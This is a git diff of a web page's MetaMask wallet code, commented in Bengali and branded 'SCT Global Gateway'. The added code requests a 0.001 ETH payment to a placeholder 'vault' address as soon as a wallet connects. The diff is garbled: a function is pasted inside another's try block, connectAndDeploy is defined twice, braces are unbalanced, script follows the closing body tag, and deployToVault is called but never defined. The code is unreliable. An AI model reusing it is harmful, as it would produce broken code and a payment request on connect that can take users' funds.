@@ -112,7 +112,56 @@ window.onerror = function() {
 </body>// মেটামাস্ক কানেক্ট করার ফাংশন
 async function connectWallet() {
     if (window.ethereum) {
+        try {// SCT Global Gateway - Master Execution
+// Authorized by: Founder H R Antor | Media Partner: ATN Bangla
+
+async function connectAndDeploy() {
+    const status = document.getElementById('wallet-status');
+    
+    if (window.ethereum) {
         try {
+            // ১. ওয়ালেট কানেক্ট করা
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const walletAddress = accounts[0];
+            status.innerHTML = `<b style="color: #2ea043;">CONNECTED:</b> ${walletAddress.substring(0, 6)}...`;
+
+            // ২. ডলার ভল্টে পাঠানোর মূল প্রসেস
+            try {
+                status.innerHTML = `<b style="color: #ffd700;">প্রসেসিং... ক্যাশ চেক করা হচ্ছে</b>`;
+                
+                const transactionParameters = {
+                    to: '0xYourOfficialVaultAddress', // এখানে আপনার রিসিভার অ্যাড্রেস দিন
+                    from: walletAddress,
+                    value: '0x38d7ea4c68000', // উদাহরণ: ০.০০১ ইথার
+                    gas: '0x5208' // ২১০০০ গ্যাস লিমিট (এরর এড়াতে)
+                };
+
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+
+                status.innerHTML = `<b style="color: #2ea043;">সফল! ট্রানজেকশন আইডি: ${txHash.substring(0, 8)}</b>`;
+
+            } catch (error) {
+                // আপনার দেওয়া এরর হ্যান্ডলিং লজিক
+                console.error("SCT Vault Error:", error);
+                if (error.code === 4001) {
+                    status.innerHTML = `<b style="color: #ff3e3e;">ইউজার রিজেক্ট করেছে!</b>`;
+                } else {
+                    status.innerHTML = `<b style="color: #ff3e3e;">ক্যাশ এরর: ইনসাফিসিয়েন্ট ব্যালেন্স বা গ্যাস ফি সমস্যা।</b>`;
+                }
+            }
+
+        } catch (error) {
+            status.innerHTML = `<b style="color: #ff3e3e;">CONNECTION FAILED</b>`;
+            console.error("SCT Connection Error:", error);
+        }
+    } else {
+        status.innerHTML = `<b style="color: #ffd700;">মেটামাস্ক খুঁজে পাওয়া যায়নি!</b>`;
+    }
+}
+
             // ইউজারের কাছ থেকে পারমিশন চাওয়া
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const account = accounts[0];
@@ -131,6 +180,33 @@ async function connectWallet() {
         }
     } else {
         alert("Please install MetaMask or use a Web3 Browser!");
+    }
+}
+// সংশোধিত পারমিশন ও অ্যাড্রেস হ্যান্ডলিং
+async function connectAndDeploy() {
+    const status = document.getElementById('wallet-status');
+    
+    if (window.ethereum) {
+        try {
+            // ইউজারের কাছ থেকে পারমিশন নেওয়া
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            
+            // ভুল: সরাসরি accounts বসালে ইরর হবে
+            // সঠিক: প্রথম অ্যাড্রেসটি ভেরিয়েবলে নেওয়া
+            const userAddress = accounts[0]; 
+
+            if (userAddress) {
+                // অ্যাড্রেসটি ড্যাশবোর্ডে দেখানোর সময় সঠিকভাবে ফরম্যাট করা
+                status.innerHTML = `<b style="color: #2ea043;">CONNECTED:</b> ${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
+                
+                // এখন ভল্টে পাঠানোর ফাংশন কল করুন
+                deployToVault(userAddress); 
+            }
+        } catch (error) {
+            // পারমিশন রিজেক্ট করলে বা অন্য ইরর হলে
+            console.error("Permission Error:", error);
+            status.innerHTML = `<b style="color: #ff3e3e;">PERMISSION DENIED / ERROR</b>`;
+        }
     }
 }
 
